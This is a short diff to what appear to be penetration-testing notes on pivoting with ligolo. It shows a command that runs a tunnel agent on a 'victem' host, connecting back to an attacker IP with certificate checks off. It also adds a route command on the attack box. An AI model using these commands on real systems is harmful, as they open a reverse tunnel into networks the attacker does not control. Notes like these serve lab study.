@@ -20,3 +20,9 @@ on victem
 ``` powershell
 .\agent -connect 192.168.45.228:11601 -ignore-cert
 ```
+
+on attack box
+
+``` bash 
+ sudo ip route add <network_address>/<CIDR> dev ligolo
+```
